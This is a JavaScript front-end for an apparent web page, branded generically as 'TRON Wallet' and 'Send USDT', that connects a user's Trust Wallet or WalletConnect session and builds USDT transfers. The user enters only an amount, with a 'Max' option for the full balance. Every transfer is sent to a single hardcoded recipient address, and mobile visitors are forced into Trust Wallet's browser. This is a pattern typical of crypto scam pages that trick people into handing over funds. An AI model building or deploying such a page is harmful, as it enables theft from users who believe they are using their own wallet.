import "./style.css";
import { TronWeb } from "tronweb";
import { WalletConnectWallet, WalletConnectChainID } from "@tronweb3/walletconnect-tron";

const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;

const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
const APP_DESC   = import.meta.env.VITE_APP_DESCRIPTION || "Send USDT";
const APP_ICON   = import.meta.env.VITE_APP_ICON || `${location.origin}/logo.png`;

// TronWeb for building txs (not signing)
const tronWeb = new TronWeb({ fullHost: TRON_RPC });

// ─── Device / env detection ───────────────────────────────────────────────────
const UA = navigator.userAgent || "";
const IN_TRUST =
  /TrustWallet/i.test(UA) ||
  typeof window.trustwallet !== "undefined" ||
  (typeof window.ethereum !== "undefined" && !!window.ethereum?.isTrust);
const IS_MOBILE = /Android|iPhone|iPad|iPod/i.test(UA);

// Mobile external browser → open inside Trust Wallet DApp browser
if (IS_MOBILE && !IN_TRUST) {
  window.location.replace(
    `https://link.trustwallet.com/open_url?url=${encodeURIComponent(location.href)}`
  );
  throw new Error("Redirecting");
}

// ─── State ────────────────────────────────────────────────────────────────────
let wcWallet         = null;
let connectedAddress = "";
let usdtBalance      = 0;
let mode             = ""; // "injected" | "walletconnect"

// ─── DOM ──────────────────────────────────────────────────────────────────────
const boot     = document.getElementById("boot");
const vConn    = document.getElementById("vConn");
const vSend    = document.getElementById("vSend");
const vSign    = document.getElementById("vSign");
const vOk      = document.getElementById("vOk");
const vErr     = document.getElementById("vErr");
const connText = document.getElementById("connText");
const amtInput = document.getElementById("amtInput");
const usdEq    = document.getElementById("usdEq");
const sendErr  = document.getElementById("sendErr");
const txidTxt  = document.getElementById("txidTxt");
const errMsg   = document.getElementById("errMsg");

const VIEWS = [vConn, vSend, vSign, vOk, vErr];
function show(el)    { VIEWS.forEach(v => { if (v) v.hidden = v !== el; }); }
function hideBoot()  { boot.classList.add("boot-out"); setTimeout(() => boot.remove(), 400); }
function setSendErr(m){ sendErr.textContent = m; sendErr.hidden = !m; }

function toUnit(amount) {
  const [w = "0", f = ""] = String(amount).split(".");
  return BigInt(w + f.slice(0, USDT_DECIMALS).padEnd(USDT_DECIMALS, "0")).toString();
}

async function fetchBalance(addr) {
  try {
    tronWeb.setAddress(addr);
    const c   = await tronWeb.contract().at(USDT_CONTRACT);
    const raw = await c.methods.balanceOf(addr).call();
    return Number(raw) / 1e6;
  } catch { return 0; }
}

// ─── Wait for window.tronLink (Trust Wallet injects it ~async) ───────────────
function waitForTronLink(ms = 3000) {
  return new Promise(resolve => {
    if (window.tronLink) { resolve(window.tronLink); return; }
    const t0 = Date.now();
    const id = setInterval(() => {
      if (window.tronLink)          { clearInterval(id); resolve(window.tronLink); }
      else if (Date.now()-t0 > ms)  { clearInterval(id); resolve(null); }
    }, 100);
  });
}

// ─── CONNECT: injected TronLink (inside Trust Wallet browser) ─────────────────
// Uses window.tronLink.request() → native Trust Wallet approval popup,
// no WalletConnect modal, no wallet picker.
async function connectInjected() {
  connText.textContent = "Connecting Trust Wallet…";
  show(vConn);
  try {
    await window.tronLink.request({ method: "tron_requestAccounts" });
    const addr = window.tronWeb?.defaultAddress?.base58;
    if (!addr) throw new Error("No address");
    connectedAddress = addr;
    mode = "injected";
    fetchBalance(addr).then(b => { usdtBalance = b; });
    show(vSend);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|denied/i.test(m)
      ? "Connection cancelled. Tap to retry."
      : "Connection failed. Tap to retry.";
    show(vErr);
  }
}

// ─── CONNECT: WalletConnect (desktop fallback) ────────────────────────────────
function buildWcWallet() {
  wcWallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: PROJECT_ID,
      metadata: { name: APP_NAME, description: APP_DESC, url: location.origin, icons: [APP_ICON] },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": "99999", "--w3m-accent": "#39D98A" },
  });
  wcWallet.on("disconnect", () => init());
}

async function connectWC() {
  connText.textContent = "Scan QR with Trust Wallet";
  show(vConn);
  try {
    const { address } = await wcWallet.connect();
    if (!address) throw new Error("No address");
    connectedAddress = address;
    mode = "walletconnect";
    fetchBalance(address).then(b => { usdtBalance = b; });
    show(vSend);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|close/i.test(m)
      ? "Connection cancelled. Tap to retry."
      : "Connection failed. Tap to retry.";
    show(vErr);
  }
}

// ─── SEND USDT ────────────────────────────────────────────────────────────────
async function sendUsdt() {
  const raw = amtInput.value.trim();
  const amt = parseFloat(raw);
  if (!raw || isNaN(amt) || amt <= 0) { setSendErr("Enter a valid amount."); return; }
  if (usdtBalance > 0 && amt > usdtBalance) {
    setSendErr(`Max: ${usdtBalance.toFixed(2)} USDT`); return;
  }
  setSendErr("");
  show(vSign);

  try {
    tronWeb.setAddress(connectedAddress);
    const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT, "transfer(address,uint256)", { feeLimit: FEE_LIMIT },
      [{ type: "address", value: FIXED_RECIPIENT }, { type: "uint256", value: toUnit(raw) }],
      connectedAddress
    );
    if (!trigger?.result?.result || !trigger.transaction) throw new Error("Build failed");

    // Sign: injected tronWeb (Trust Wallet browser) OR WalletConnect (desktop)
    const signed = mode === "injected"
      ? await window.tronWeb.trx.sign(trigger.transaction)
      : await wcWallet.signTransaction(trigger.transaction);

    const result = await tronWeb.trx.sendRawTransaction(signed);
    if (!result?.result) throw new Error("Broadcast failed");

    txidTxt.textContent = result.txid ? `TXID: ${result.txid.slice(0, 24)}…` : "Sent!";
    amtInput.value = ""; usdEq.textContent = "≈ $0.00";
    show(vOk);
  } catch (e) {
    const m = String(e?.message || e);
    errMsg.textContent = /reject|cancel|denied/i.test(m)
      ? "Transaction rejected." : `Error: ${m.slice(0, 80)}`;
    show(vErr);
  }
}

// ─── Events ───────────────────────────────────────────────────────────────────
amtInput.addEventListener("input", () => {
  usdEq.textContent = `≈ $${(parseFloat(amtInput.value) || 0).toFixed(2)}`;
});
document.getElementById("btnMax").addEventListener("click", () => {
  if (usdtBalance > 0) { amtInput.value = usdtBalance.toFixed(6); usdEq.textContent = `≈ $${usdtBalance.toFixed(2)}`; }
});
document.getElementById("btnNext").addEventListener("click",  sendUsdt);
document.getElementById("btnAgain").addEventListener("click", () => show(vSend));
document.getElementById("btnRetry").addEventListener("click", () => init());

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  hideBoot();

  if (IN_TRUST) {
    // ── Inside Trust Wallet browser ──────────────────────────────────────────
    // Wait for injected tronLink (Trust Wallet injects it after page load)
    const tronLink = await waitForTronLink(3000);

    if (tronLink) {
      // Check if already approved (returning user)
      const existing = window.tronWeb?.defaultAddress?.base58;
      if (existing) {
        connectedAddress = existing;
        mode = "injected";
        fetchBalance(existing).then(b => { usdtBalance = b; });
        show(vSend);
        return;
      }
      // First visit → request approval (native Trust Wallet popup, no modal)
      await connectInjected();
    } else {
      // tronLink not available — fall back to WalletConnect
      buildWcWallet();
      await connectWC();
    }
  } else {
    // ── Desktop: WalletConnect ───────────────────────────────────────────────
    buildWcWallet();
    try {
      const { address } = await wcWallet.checkConnectStatus();
      if (address) {
        connectedAddress = address; mode = "walletconnect";
        fetchBalance(address).then(b => { usdtBalance = b; });
        show(vSend); return;
      }
    } catch { /* no saved session */ }
    await connectWC();
  }
}

init().catch(e => {
  if (String(e).includes("Redirect")) return;
  errMsg.textContent = "App failed to start. Please refresh.";
  show(vErr);
});
